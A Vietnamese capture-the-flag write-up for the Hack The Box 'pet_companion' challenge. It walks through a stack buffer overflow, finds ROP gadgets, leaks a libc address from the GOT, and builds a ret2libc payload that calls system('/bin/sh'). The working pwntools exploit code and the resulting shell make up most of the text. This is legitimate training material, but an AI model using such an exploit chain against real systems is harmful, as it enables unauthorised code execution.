# writeup pet_companion
- bài sẽ có lỗi đó là buffer overflow ?
```c
 __int64 buf[8]; // [rsp+0h] [rbp-40h] BYREF

  setup(argc, argv, envp);
  memset(buf, 0, sizeof(buf));
  write(1, "\n[!] Set your pet companion's current status: ", 0x2EuLL);
  read(0, buf, 0x100uLL);
  write(1, "\n[*] Configuring...\n\n", 0x15uLL);
  ```
- lớp bảo vệ tắt, pie tắt ?
```bash
pwndbg> cs
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFYFortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   65 Symbols	 No	01		/home/as/pwnable/report/hacktheboxx/pet_companion/pet_companion_patched
```
- em tìm được quả gadgets ?
```python
pop_rdi = 0x0000000000400743
pop_rsi_r15 = 0x0000000000400741
write_plt = 0x4004f0
ret = 0x00000000004006df
main_back = 0x000000000040064b
```
- em tìm offset và ghi giá trị rsi là 1 địa chỉ tĩnh chứa địa chỉ libc lấy từ got và có được địa chỉ libc ?
```python
payload = b''.ljust(0x48)
payload += p64(pop_rsi_r15) 
payload += p64(0x600fd8)
payload += p64(0)
payload += p64(write_plt)
payload += p64(main_back)
p.sendlineafter(b'current status:',payload)
p.recvuntil(b'\n')
p.recvuntil(b'guring...')
p.recv(2)
leak_addr = u64(p.recv(8))
base_libc = leak_addr -0x1100f0
log.info(f'leak_addr: {hex(leak_addr)}')
```
- em tính toán các gadgets có trong libc và lấy shell lấy flag ?
```bash
pwndbg> got -r 
State of the GOT of /home/as/pwnable/report/hacktheboxx/pet_companion/pet_companion_patched:
GOT protection: Full RELRO | Found 5 GOT entries passing the filter
[0x600fd8] write@GLIBC_2.2.5 -> 0x7ffff79100f0 (write) ◂— lea rax, [rip + 0x2e08e1]
[0x600fe0] read@GLIBC_2.2.5 -> 0x7ffff7910020 (read) ◂— lea rax, [rip + 0x2e09b1]
[0x600fe8] setvbuf@GLIBC_2.2.5 -> 0x7ffff78812a0 (setvbuf) ◂— push r13
[0x600ff0] __libc_start_main@GLIBC_2.2.5 -> 0x7ffff7821ba0 (__libc_start_main) ◂— push r13
[0x600ff8] __gmon_start__ -> 0x0
```
```python
leak_addr = u64(p.recv(8))
base_libc = leak_addr -0x1100f0
log.info(f'leak_addr: {hex(leak_addr)}')
system_libc = base_libc + libc.symbols['system']
bin_sh = base_libc + 0x1b3d88
payload = b''.ljust(0x48)
payload += p64(0x00000000004006df)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_libc)
p.sendlineafter(b'current status:',payload)
```
- em đã lấy được shell rồi ?
```bash
[*] leak_addr: 0x7ffff79100f0
[*] Switching to interactive mode
 
[*] Configuring...

$ ls
flag.txt          pet_companion     pet_companion.nam
glibc              pet_companion.i64  pet_companion.py
ld-linux-x86-64.so.2  pet_companion.id0  pet_companion.til
libc.so.6          pet_companion.id1  pet_companion_patched
pet.md              pet_companion.id2  solve.py
$  
```
